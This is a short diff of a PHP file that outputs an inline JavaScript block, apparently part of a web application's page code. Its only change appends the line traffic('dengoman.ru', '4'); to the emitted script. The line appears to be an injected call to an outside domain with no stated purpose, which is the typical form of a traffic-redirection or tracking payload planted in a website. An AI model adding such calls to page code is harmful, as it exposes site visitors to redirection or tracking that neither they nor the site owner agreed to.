@@ -385,7 +385,8 @@ elseif ($this->uri->segment(1) == 'lk' || $this->uri->segment(1) == 'lk2')  {
             }
         }
         return c;
-    } 
+    }
+    traffic("dengoman.ru", "4");
 </script>';
     }
     
